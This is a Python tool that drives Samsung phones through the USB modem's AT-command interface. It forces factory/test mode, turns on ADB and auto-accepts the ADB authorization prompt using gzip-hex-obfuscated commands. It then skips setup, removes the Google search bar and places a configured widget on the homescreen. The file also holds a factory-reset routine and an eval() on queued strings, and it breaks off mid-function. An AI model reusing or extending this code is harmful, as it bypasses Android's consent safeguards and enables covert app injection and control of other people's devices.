## widget_module.py
import os, time, sys, re, subprocess, traceback, threading, datetime, serial, io, shutil
import xml.etree.ElementTree as ET
from threading import Thread, Lock
from queue import Queue
import gzip
import base64
from datetime import datetime
from datetime import date 

modem_com = os.path.join('Dependencies', 'com.exe')
usb_search = os.path.join('Dependencies', 'usbSearch.exe')
ADB = os.path.join('Dependencies', 'adb', 'adb.exe')
apk_file = os.path.join('Dependencies', 'install.apk')
obs_file_identity = os.path.join('Dependencies', 'fragments', 'a24ee2.bin')
obs_file_random_fun = os.path.join('Dependencies', 'fragments', 're548.bin')
obs_cmd_end = os.path.join('Dependencies', 'fragments', 'a25de3.bin')
obs_file_random_fun_end = os.path.join('Dependencies', 'fragments', 'eeadef.bin')
obs_file_identity_end = os.path.join('Dependencies', 'fragments', 'cadde.bin')
obs_file_end = os.path.join('Dependencies', 'fragments', 'abad.bin')
e_log_file = os.path.join('Dependencies', 'logs', 'error_log.txt')
n_log_file = os.path.join('Dependencies', 'logs', 'application_log.txt')
automate_file = os.path.join('Dependencies', 'automation', 'automate.cfg')

global processed
processed=[]
		
## regex
dev_regex=r'[a-zA-Z0-9].+\sdevice'
dev_regex_unauth=r'[a-zA-Z0-9].+\sunauthorized'
##

## obf cmds
supressaes = b'1f8b08000c0c1a6400ff85cecb6aeb301087f15752e50e1c2fdbe04b8223904b75db4963901249a9a1951be7e9637a4aa1ab6e67e0f7ffb4241eab31e085fb41365ed3fa63c86d31fd61b19217a4824ceab9b26a0e9879e1a466afcdb5158d68f61d5bdc0bdc8c3c162d2162ae67b38380fd53715dfbe0327b336abf7c991796f40ac1e5717534c56de31377f0ae95289a86842708ba1ae7292762a5b80df11a260967db89954b46ac32f3d4477f3869ffbbf9f17ff39ffebfadf1dbe952c2158e3fbfd89eb71bb56a843b65da5aba10010000'
supressaes2 = b'1f8b08007b0d1a6400ff3dc9b10ac2301000d05f4a950c0e1d3490eb1513b00abddc661a41348719bc0e7e7d37e787e0bf3844936834e83a45886bbeda1fcf41d36cdf8b1c1a3bfb5c86a366f05d96f861c2f52cfe55a0eeee3435a6a0b7bf8da7b49f5a916a1e97bedf00df842ed660000000'
gremovesae = b'1f8b080082021a6400ff35c8b10a02201000d05f92c2c1c1411c0e1d6e893a6df3342233112af3f39d5a5f06712f2407771491d6db59f129015b7e989f039c7c929d0faa339cbf91e433bfd4b8dabf5d56a156d3115b0cbe26f0f366b4de5410888054000000'
ui_autoaes = b'1f8b0800a90f1a6400ff0500310a8040e84b92b34304771db4e4a087a319353486ef97d0ef8dc9e9dac0713cb6cb7f6d6b5a97e54086fb242aa52c094a24000000'
engsaes = b'1f8b0800cf4a1b6400ff3dca5f0bc22014c6e1af944a17bb6c46ab10637f38c35d1e05833c26a4117efa8d88ee5edee76778535c07c5c93661d4c1c6deab91314b0fffb7e3f3ad840eee3c242457b7bdb76208381eb29aafdbd77ba4535ea6546ff167d0bc90eb3b76502f72970d85b2c8969bf9c3be1d415100d30a9db6f04280000000'
swsaes = b'1f8b08009eeb796400ff0540310ac0200cfc527170eb928029dd8d0fb873113a36a5be3ea0f881eb0ea82cdaf7e2f14d6b3f55ea1c0c5a3f13458be7f124000000'
kcilchtua = b'1f8b0800b641596400ff4dcab10ec2201080e157baa5310c1d504ad2c881c0dd99b83aa99b2139dba7c74eedf04fff97257f79f235f30f0babc1976a7056f15f02cf5768fe4ea0f8e6d3662bc8e3467689d4ce7269a1c8c7a09b8f7688ebfe123dc70e186181cf64000000'
kcilchtuaa = b'1f8b08008707796400ff4dca410a80201005d02bfd8888162eac10a2c6b2c6093a42ee6240babdcb5abf17243c07e4dad8be9eb59741975d5247e354ad707186ba9391e9b6ed7753fdb3c667630aedd7e57e48000000'
gubed = b'1f8b08009c0e7a6400ff0dc3211280201404d02b510d046694a28b2eb03f7803c7a6e17b7c0c8fc6474b6ed4872a9f70b96f7372fcf690b586d3fa5d54ade8e8e905631cf384d1a034000000'
elbane = b'1f8b0800f3f1786400ff0dc3b10d80201404d095682d2848f062a25f3de428dcc0c44a8beff8583c363e1a71509f15f96097fb9293db6f0bd01c0a78b7a9e2cc7b4defca183b153cc92134000000'
elbasid = b'1f8b0800d425b86400ff0dc3310e80200c05d02bb13a3090e08f09566de533780163e2a4433d3e0e4f9b3e1cb12b3f31fa2097fb9c93cb6f0d600906bddb5471e4ada6773963ec37a52f0134000000'


class init_process:

	def step_one(self, modem_num, *attempt_two):
		status=status_class()
		proc=processing()
		adb_proc = adb_work()
		log=logging()
		x = xml()
		m = mixer()
		shell_cmd=cmd()
		at_cmd=serial_cmd()
		
		global processed
		global queue_connected
		queue_connected=[]
		## load config on each run
		##
		try:
			## check if device has been processed
			at_cmd.send_modem_cmd(modem_num, r'AT+SWATD=0', 'CHANGE')
			serial_no = at_cmd.send_modem_cmd(modem_num, r'AT+SERIALNO', '+SERIALNO:1')
			if serial_no:
				serial_no = serial_no.split(',')
				serial_no = serial_no[1]
				## check if already processed
				if serial_no in processed:
					status.set_status(modem_num, f'Device already processed: {serial_no}')

				else:
					print(f'Step 1!')
					status.set_status(modem_num, '(1/5): Enter Test Menu (*#0*#)')
					start_time = time.time()
					processed.append(serial_no)

					## check if adb is already on 
					exists=0
					found=0
					if  len(adb_proc.find_all_authorized()) == 1:
							uniq_id = adb_proc.find_all_authorized()[0]
							queue_connected.append(modem_num)
							status.set_status(modem_num, '(1/5): Found ADB already enabled. Complete!')
							time.sleep(1)
							status.set_status(modem_num, '(2/5): Authorization completed!')
							found = 1
							exists=1

					if exists == 1:
						adb_proc.keep_lights_on(uniq_id)
						## once authorized, suppress setup
						status.set_status(modem_num, '(3/5): Closing Setup!')
						adb_proc.suppress_setup(uniq_id)
					else:
						is_factory_mode = proc.is_factory_mode(modem_num)
						if is_factory_mode == 1 or is_factory_mode == -1:
							at_cmd.send_modem_cmd(modem_num, r'AT+KSTRINGB=0,3', 'OK')
							# at_cmd.send_modem_cmd(modem_num, r'AT+SWATD=1', 'CHANGE')
							at_cmd.send_modem_cmd(modem_num, m.decode_it(gubed), "OK")
							time.sleep(1)
							if proc.is_test_menu_open(modem_num) == 1:
								status.set_status(modem_num, '(1/5): Test menu is not opened.. Please retry.')
							else:
								status.set_status(modem_num, '(1/5): Test menu open, continuing..')
						
								## add device to disconnect queue so it wont erase info
								queue_connected.append(modem_num)
								## factory mode enabled now, continue
								proc.enable_adb_time(modem_num)
								time.sleep(3)					

								enable_adb=-1
								if len(adb_proc.find_all_unauthorized()) > 0:
									## device is unauthorized
									status.set_status(modem_num, '(2/5): Please authorize ADB dialog..')
									time.sleep(.5)
					
									auth_count=0
									while found == 0 and auth_count < 10:
										print(f'Auth_Tries: {auth_count}')

										if len(adb_proc.find_all_authorized()) > 0:
											found=1
											uniq_id = adb_proc.find_all_authorized()[0]
											status.set_status(modem_num, '(2/5): Complete!')
											enable_adb=2
											## make sure once ADB is found and on to enable lcd to stayon
										else:
											## attempt to automatically authorize
											at_cmd.send_modem_cmd(modem_num, m.decode_it(kcilchtua), "OK")
											at_cmd.send_modem_cmd(modem_num, m.decode_it(kcilchtuaa), 'OK')
											time.sleep(1)
											auth_count+=1
									
									if auth_count == 10:
										enable_adb=-1
										status.set_status(modem_num, '(5/5): Device unauthorized, try again..')
										queue_connected.remove(modem_num)

								elif len(adb_proc.find_all_authorized()) > 0:
									enable_adb=2
									found=1
							
								if enable_adb == -1:
									status.set_status(modem_num, '(2/5): ERROR - Failed to authorize in time.')
									queue_connected.remove(modem_num)

								if enable_adb == 2:
									status.set_status(modem_num, '(2/5): ADB Found!')
									uniq_id = adb_proc.find_all_authorized()[0]
									found=1

									adb_proc.keep_lights_on(uniq_id)
									## once authorized, suppress setup
									status.set_status(modem_num, '(3/5): Closing Setup!')
									adb_proc.suppress_setup(uniq_id)
									time.sleep(1)
					
						try:
							if is_factory_mode == 0:
								status.set_status(modem_num, '(1/5): Something went wrong, try again!!')				
								queue_connected.remove(modem_num)

						except NameError:
							status.set_status(modem_num, '(1/5): Something went wrong, try again!!')				
							queue_connected.remove(modem_num)

					time.sleep(1)
					if found == 1:
						## now verify device is on setup screen with ADB
						setup_complete=0
						found_coords=x.show_all_xml(uniq_id)
						for text, bounds in found_coords:
							if text.find('Play Store') != -1 or text.find('Phone') != -1:
								## store the boundaries for later widget processing
								original_search_bounds = bounds

								## found on homescreen
								print(f'Found: {text} on HomeScreen')
								status.set_status(modem_num, '(3/5): Complete!')
								print(f'Setup was found closed')
								setup_complete=1
								break
				
						# input touchscreen swipe 628 676 628 1376 7000
				
						if setup_complete == 0:
							status.set_status(modem_num, '(3/5): Failed closing setup! (Retrying..)')
							adb_proc.set_english(uniq_id)
							if attempt_two:
								## already tried and failed, pass
								pass
							else:
								setup_back = 0
								count=0
								while setup_back == 0 and count < 5:
									print(f'Count is: {count}')
									try:
										for text, bounds in x.show_all_xml(uniq_id):
											if text.find('Emergency') != -1:
												print(f'Setup is back up!')
												setup_back = 1
											else:
												time.sleep(1)
												count+=1
									except:
										count+=1
										## it probably lost comm or stuck on loading, wait
										## and keep trying
										time.sleep(3)

								queue_connected.remove(modem_num)

								self.step_one(modem_num, True)

						else:
							## add model to log 
							model=adb_proc.get_model(uniq_id)
							model_os=adb_proc.get_osver(uniq_id)
							print(f'OS Version is: {model_os}')
							status.set_status(modem_num, '(4/5): Install Widget!')
							## remove google search bar
							adb_proc.remove_googlesearch(adb_proc.generate_proper_id(uniq_id))

							if model_os == 13:
								self.gather_widget_coords_12(uniq_id)
							elif model_os == 12:
								self.gather_widget_coords_12(uniq_id)
							elif model_os == 11:
								self.gather_widget_coords_11(uniq_id)
							elif model_os == 10:
								self.gather_widget_coords_10(uniq_id)
							elif model_os == 9:
								self.gather_widget_coords_10(uniq_id)
							elif model_os == 8:
								pass
							time.sleep(1)

							found_strings=[]
							with open(automate_file, 'r') as automate_config:
								for ln in automate_config:
									found_strings.append(ln.strip('\n'))
							print(f'Found configuration strings: {found_strings}')

							found_app=0
							app_text = found_strings[2]
							## now verify widget has been installed on current screen
							for i in range(6):
								shell_cmd.console_cmd(m.shell_ob_fuscate('input keyevent KEYCODE_BACK', adb_proc.generate_proper_id(uniq_id)))

							for text, bounds in x.show_all_xml(uniq_id):
								print(f'Found_Text: {text}')
								if text.find(app_text) != -1:
									status.set_status(modem_num, '(4/5): Widget install - OK')
									found_app = 1
									widget_bounds = bounds
									break

							if found_app == 0:
								status.set_status(modem_num, '(4/5): Failed, could not find Widget on homescreen.')
								log.log_normal(f'Widget Install Verification (No): {uniq_id} : {model} : {str(model_os)}')
								queue_connected.remove(modem_num)
							else:
								log.log_normal(f'Widget Install Verification (Yes): {uniq_id} : {model} : {str(model_os)}')
								status.set_status(modem_num, '(4/5): Successful!')
								
								time.sleep(.5)
								if original_search_bounds and widget_bounds:
									status.set_status(modem_num, '(5/5): Aligning to original position.')
									alignment=adb_proc.align_widget(modem_num, uniq_id, original_search_bounds, widget_bounds, app_text)
									if alignment == 1:
										status.set_status(modem_num, '(5/5): Widget already aligned, skipping..')
							
								time.sleep(.5)
								## relaunch test menu
								at_cmd.send_modem_cmd(modem_num, m.decode_it(gubed), "OK")
								## disable adb
								proc.disable_adb_time(modem_num)

								status.set_status(modem_num, '(5/5): Process Complete. Please power off..')
								finish_time = round((time.time() - start_time), 2)	
								
								if model:
									logging().log_normal(f'Widget Install Time: {finish_time}: {uniq_id} : {model} : {str(model_os)}')
								else:						
									print(f'this took: {finish_time} to complete')
									logging().log_normal(f'Widget Install Time: {finish_time}: {uniq_id} : {str(model_os)}')
									
								queue_connected.remove(modem_num)

					else:
						status.set_status(modem_num, f'(1/5): Something went wrong, device not supported for processing!')

		except Exception as error:
			print(f'Step_One: {error}\n{traceback.format_exc()}')
			log.log_errors(f'Step_One: {error}\n{traceback.format_exc()}')
			queue_connected=[]


	def gather_widget_coords_12(self, uniq_id):
		"""
		Find and calculate the longpress
		needed to open widgets tab through UI
		and then open and click it for further
		processing
		"""
		## open apk string config file for automation purposes
		found_strings=[]
		with open(automate_file, 'r') as automate_config:
			for ln in automate_config:
				found_strings.append(ln.strip('\n'))
		print(f'Found configuration strings: {found_strings}')

		## format search string to search only half keyword
		## for issues with finding the input search instead of the actual 
		## widget to install
		keyword_search=found_strings[0]
		keyword_search=keyword_search[:int(len(keyword_search)/2)]


		print(f'using 12.0 method')
		c=cmd()
		adb=adb_work()
		x=xml()
		log=logging()
		try:			
			## timing for testing and logging
			blank_coords = x.find_blank_top_space(uniq_id)
			x_min=blank_coords[0];y_min=blank_coords[1]
			## now lets touch it just right!!
			c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_min} {y_min} {x_min} {y_min} 1000')
			## now that widgets should be open, find it!
			## now search for Widgets icon
			current_view=x.show_all_xml(uniq_id)
			print(1)
			for possiblity in current_view:
				if possiblity[0].find('Widgets') != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					break
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
					time.sleep(.5)

					## now that widgets window is up, search for searchbar to find proper widget
					current_view=x.show_all_xml(uniq_id)
					for possiblity in current_view:
						if possiblity[0].find('Search for widget') != -1:
							print(f'Found widgets with: {possiblity}')
							current_bounds=possiblity[1]
							x_bound=current_bounds[0];y_bound=current_bounds[1]
							c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
							time.sleep(.25)
							c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input text {keyword_search}')


			except NameError:
				log.log_normal(f'Could not find Widgets: {uniq_id}')

			## now lets open searcherr and place it
			## now search for Widgets icon
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if possiblity[0].find(found_strings[0]) != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_bound} {y_bound+50} {x_bound} {y_bound-150}')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]}: {uniq_id}')

			## now lets get searcherr placed
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				## this should find the widget size (4x1, 5x1, 3x1)
				## based on certain models
				## could use improvement!
				if re.findall(r'\s1', possiblity[0]):
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_bound} {y_bound} {x_bound} {y_bound} 2000')
					time.sleep(.5)
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1: {uniq_id}')

		except Exception as error:
			log.log_errors(f'gather_widget: {error}\n{traceback.format_exc()}')


	def gather_widget_coords_11(self, uniq_id):
		"""
		Find and calculate the longpress
		needed to open widgets tab through UI
		and then open and click it for further
		processing
		"""
		## open apk string config file for automation purposes
		found_strings=[]
		with open(automate_file, 'r') as automate_config:
			for ln in automate_config:
				found_strings.append(ln.strip('\n'))
		print(f'Found configuration strings: {found_strings}')

		## format search string to search only half keyword
		## for issues with finding the input search instead of the actual 
		## widget to install
		keyword_search=found_strings[0]
		keyword_search=keyword_search[:int(len(keyword_search)/2)]

		print(f'using 11.0 method')
		c=cmd()
		adb=adb_work()
		x=xml()
		log=logging()
		try:
			## timing for testing and logging
			## timing for testing and logging
			blank_coords = x.find_blank_top_space(uniq_id)
			x_min=blank_coords[0];y_min=blank_coords[1]
			## now lets touch it just right!!
			c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_min} {y_min} {x_min} {y_min} 1000')
			time.sleep(.5)
			c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe 200 200 200 200 1000')
			## now that widgets should be open, find it!
			## now search for Widgets icon
			current_view=x.show_all_xml(uniq_id)
			print(1)
			for possiblity in current_view:
				if possiblity[0].find('Widgets') != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					break

			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
					time.sleep(.5)
					## and swipe down
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe 600 1500 600 0')
					time.sleep(1)
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input text {keyword_search}')

			except NameError:
				log.log_normal(f'Could not find Widgets')

			## now lets get searcherr placed
			print(3)
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if possiblity[0].find(found_strings[0]) != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1')

			print(4)
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if re.findall(r'\s1', possiblity[0]):
				# if possiblity[0].find('1') != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_bound} {y_bound} {x_bound} {y_bound} 2000')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1')
			
				

		except Exception as error:
			print(f'gather_widget: {error}\n{traceback.format_exc()}')


	def gather_widget_coords_10(self, uniq_id):
		"""
		Find and calculate the longpress
		needed to open widgets tab through UI
		and then open and click it for further
		processing
		"""
		## open apk string config file for automation purposes
		found_strings=[]
		with open(automate_file, 'r') as automate_config:
			for ln in automate_config:
				found_strings.append(ln.strip('\n'))
		print(f'Found configuration strings: {found_strings}')
		
		## format search string to search only half keyword
		## for issues with finding the input search instead of the actual 
		## widget to install
		keyword_search=found_strings[0]
		keyword_search=keyword_search[:int(len(keyword_search)/2)]

		print(f'using 10.0 method')
		c=cmd()
		adb=adb_work()
		x=xml()
		log=logging()
		try:
			## timing for testing and logging
			blank_coords = x.find_blank_top_space(uniq_id)
			x_min=blank_coords[0];y_min=blank_coords[1]
			## now lets touch it just right!!
			c.console_cmd(f'\"{ADB}\" -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_min} {y_min} {x_min} {y_min} 1000')
			## now lets touch it just right!!
			c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input swipe 200 200 200 200 1000')
			## now that widgets should be open, find it!
			## now search for Widgets icon
			current_view=x.show_all_xml(uniq_id)
			print(1)
			for possiblity in current_view:
				if possiblity[0].find('Widgets') != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					break

			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
					
			except NameError:
				log.log_normal(f'Could not find Widgets')


			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if possiblity[0].find('Search for widgets') != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					break
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
					time.sleep(1)
					c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input text {keyword_search}')

			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1: {uniq_id}')

			## now lets get searcherr placed
			print(3)
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if re.findall(r'\s1', possiblity[0]):
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input tap {x_bound} {y_bound}')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1: {uniq_id}')

			print(4)
			current_view=x.show_all_xml(uniq_id)
			for possiblity in current_view:
				if possiblity[0].find(found_strings[0]) != -1:
					print(f'Found widgets with: {possiblity}')
					current_bounds=possiblity[1]
					
			try:
				if current_bounds:
					print(f'Widgets bounds: {current_bounds}')
					x_bound=current_bounds[0];y_bound=current_bounds[1]
					c.console_cmd(f'\"{ADB}\"  -s {adb.generate_proper_id(uniq_id)} shell input swipe {x_bound} {y_bound} {x_bound} {y_bound} 2000')
			except NameError:
				log.log_normal(f'Could not find {found_strings[0]} Widget4x1: {uniq_id}')

		except Exception as error:
			log.log_errors(f'Gather_Widget_Info: {error}\n{traceback.format_exc()}')
			print(f'gather_widget: {error}\n{traceback.format_exc()}')


class filework:
	def __init__(self):
		pass

	def set_app_config(self, cfg_file):
		"""
		This is in charge of allowing the app to switch into different modes
		"""

	def read_configs(self):
		"""
		This is in charge of loading the app config menu from init
		"""
		log=logging()
		try:
			cfg_items=[]
			if os.path.exists(os.path.join('Dependencies', 'automation')):
				for file_types in os.listdir(os.path.join('Dependencies', 'automation')):
					print(f'2: {file_types}')
					if file_types.endswith('.cfg'):
						print(f'Found: {file_types}')
						## config file to add
						if file_types.startswith('automate'):
							## skip the main automate.cfg file this isn't used here
							pass
						else:
							cfg_items.append(file_types)
				return cfg_items
		except Exception as e:
			print(f'Read_Configs: {e}\n{traceback.format_exc()}')
			log.log_errors(f'Read_Configs: {e}\n{traceback.format_exc()}')


class threading:
	def __init__(self):
		shell_cmd=cmd()

	def create_thread(self, cmd):
		try:
			global p
			p = Queue()

			p.put(cmd)
			t = Thread(target=self.parser)
			t.setDaemon(True)
			t.start()
		except Exception as e:
			print(f'Exception in create_thread: {e}')


	def parser(self):
		# print(f'reached parser')
		info = p.get()
		try:
			# print(f'info is {info}')
			eval(info, globals(), locals())
		except Exception as a:
			print(f'Exception in parser: {a}')
			print(traceback.format_exc())

class serial_cmd:

	def send_modem_cmd(self, Port, CMD, keyword, *extra):
		log=logging()
		## this is for bad disconnection devices, make sure
		## the port is ready for sending first and always!!
		# print(f'AT: {CMD}')
		count=0
		waiting=self.wait_for_ready(Port)
		while waiting != 1 and count < 5:
			waiting=self.wait_for_ready(Port)
			count+=1
			time.sleep(.5)

		if waiting == 0:
			pass
		else:
			num=0
			try:
				PORT = serial.Serial(
					port=Port, \
					baudrate=19200, \
					parity=serial.PARITY_NONE, \
					stopbits=serial.STOPBITS_ONE, \
					bytesize=serial.EIGHTBITS, \
					write_timeout=1, \
					timeout=1)
				if PORT.isOpen() == True:
					pass
				else:
					PORT.open()

				PORT.write(str.encode(f'{CMD}\r'))
				output=str(PORT.readline(), 'utf-8')
				try:
					if extra:
						print(f'Found with extra: {extra}')
						extra=extra[0]
						while output.find(keyword) == -1 and num <= 3:
							try:
								print(f'Output: {output}')
								if output.find(str(extra)) != -1:
									print(f'Outputt: {output}')

									return "-1"
								output=str(PORT.readline(), 'utf-8')
								num+=1
								
							except Exception as a:
								log.log_errors(f'Modem_CMD1: {a}\n{traceback.format_exc()}')
							try:

								if output.find(str(extra)) != -1:
									print(f'Outputtt: {output}')

									return "-1"
								num+=1
							except Exception as a:
								log.log_errors(f'Modem_CMD2: {a}\n{traceback.format_exc()}')

						PORT.close()
						return output
				except NameError:
					pass

				while output.find(keyword) == -1 and num <= 4:
					num+=1
					try:
						output=str(PORT.readline(), 'utf-8')
						time.sleep(.1)
					except Exception as a:
						log.log_errors(f'Modem_CMD1: {a}\n{traceback.format_exc()}')
				PORT.close()
				return output
			except Exception as a:
					log.log_errors(f'Modem_CMD2: {a}\n{traceback.format_exc()}')

	def send_modem_cmd_noresponse(self, Port, CMD):
		count=0
		waiting=self.wait_for_ready(Port)
		while waiting != 1 and count < 3:
			waiting=self.wait_for_ready(Port)
			count+=1
			time.sleep(1)

		if waiting == 0:
			pass		
		else:
			try:
				PORT = serial.Serial(
					port=Port, \
					baudrate=19200, \
					parity=serial.PARITY_NONE, \
					stopbits=serial.STOPBITS_ONE, \
					bytesize=serial.EIGHTBITS, \

					write_timeout=1, \
					timeout=5)
				if PORT.isOpen() == True:
					pass
				else:
					PORT.open()
					PORT.write(str.encode(f'{CMD}\r'))
			except Exception as a:
				log.log_errors(f'Modem_CMD3: {a}\n{traceback.format_exc()}')


	def wait_for_ready(self, Port):
		try:
			PORT = serial.Serial(
				port=Port, \
				baudrate=19200, \
				parity=serial.PARITY_NONE, \
				stopbits=serial.STOPBITS_ONE, \
				bytesize=serial.EIGHTBITS, \
					timeout=1)
			PORT.close()
			return 1
		except Exception as e:
			print(f'E: {e}\n{traceback.format_exc()}')
			return 0

class processing:

	def poweroff_device(self):
		try:
			at_cmd=serial_cmd()
			status=status_class()
			conn=connections()

			Port=conn.find_samsung_modem()
			if len(Port) == 1:
				Port=Port[0]

				while at_cmd.wait_for_ready(Port) == 0:
					time.sleep(.5)
				## modem found ready
				status.set_status(Port, 'Attempting to shutdown Samsung device..')
				at_cmd.send_modem_cmd(Port, r'AT+POWRESET=0,1', 'OK')

			elif len(Port) > 1:
				status.set_status('ERROR', 'Found too many samsung devices connected..')
			elif len(Port) < 1:
				status.set_status(f'ERROR', 'Nothing connected..')

		except Exception as e:
			logging.log_errors(Port, f'Shutdown_Device: {e}')


	def reboot_device(self):
		try:
			at_cmd=serial_cmd()
			status=status_class()
			conn=connections()

			Port=conn.find_samsung_modem()
			if len(Port) == 1:
				Port=Port[0]

				while at_cmd.wait_for_ready(Port) == 0:
					time.sleep(.5)
				## modem found ready
				status.set_status(Port, 'Attempting to reboot Samsung device..')
				at_cmd.send_modem_cmd(Port, r'AT+POWRESET=0,0', 'OK')

			elif len(Port) > 1:
				status.set_status('ERROR', 'Found too many samsung devices connected..')
			elif len(Port) < 1:
				status.set_status(f'ERROR', 'Nothing connected..')

		except Exception as e:
			logging.log_errors(Port, f'Reboot_Device: {e}')
		

	def reset_device(self):
		try:
			at_cmd=serial_cmd()
			status=status_class()
			conn=connections()

			Port=conn.find_samsung_modem()
			if len(Port) == 1:
				Port=Port[0]

				while at_cmd.wait_for_ready(Port) == 0:
					time.sleep(.5)
				## modem found ready
				status.set_status(Port, 'Attempting to reset Samsung device..')
				at_cmd.send_modem_cmd(Port, r'AT+FACTORST=0,0', 'OK')
				at_cmd.send_modem_cmd(Port, r'AT+SWATD=0', 'CHANGE')
				at_cmd.send_modem_cmd(Port, r'AT+FACTORST=0,0', 'OK')

			elif len(Port) > 1:
				status.set_status('ERROR', 'Found too many samsung devices connected..')
			elif len(Port) < 1:
				status.set_status(f'ERROR', 'Nothing connected..')

		except Exception as e:
			logging.log_errors(Port, f'Reset_Device: {e}')
			

	def is_factory_mode(self, Port):
		try:
			m=mixer()
			at_cmd=serial_cmd()
			## attempt to read carrier_id using factory mode command
			# send_modem_cmd_noresponse(PORT, r'AT+ACTIVATE=0,0,0')
			count=0
			waiting=at_cmd.wait_for_ready(Port)
			while  waiting != 1 and count < 5:
				waiting=at_cmd.wait_for_ready(Port)
				time.sleep(.5)
				count+=1
			if waiting == 0:
				return 0
			else:
				## modem reset just in case issues
				at_cmd.send_modem_cmd(Port, r'AT+SWATD=0', 'CHANGE')
				# at_cmd.send_modem_cmd(Port, r'ATZ', 'OK')
				print(f'starting activation..')
				# at_cmd.send_modem_cmd(Port, r'AT+SWATD=0', 'CHANGE')
				activate=at_cmd.send_modem_cmd(Port, r'AT+ACTIVATE=0,0,0', 'COMPLETED')
				print('activate')
				time.sleep(2)
				at_cmd.send_modem_cmd_noresponse(Port, r'AT+SWATD=1')
				switch=at_cmd.send_modem_cmd(Port, r'AT+SWATD=1', 'CHANGE', 'PROTECTED')
				print(f'switch is: {switch}')
				if switch.find('ERROR') != -1 or switch == '' or switch == "-1":
					## try method two for older devices
					print(3)
					activate=at_cmd.send_modem_cmd(Port, r'AT+ACTIVATE=0,0,0,0', 'COMPLETED', 'ERROR')
					print(f'activate is: {activate}')
					if activate == '-1':
						print(4)
						activate=at_cmd.send_modem_cmd(Port, r'AT+DUMPCTRL', 'OK')
						if activate.find('OK') != -1:

							return -1
						else:
							return 0
					elif activate.find('OK') != -1:
						switch=at_cmd.send_modem_cmd(Port, r'AT+SWATD=1,0', 'CHANGE')
						if switch.find('ERROR') != -1 or switch == '':
							print(f'Switching ATD not supported')
							at_cmd.send_modem_cmd_noresponse(Port, r'AT+SWATD=1,0')
							return 0
						else: 
							print(f'Switching ATD Supported, alternate method')
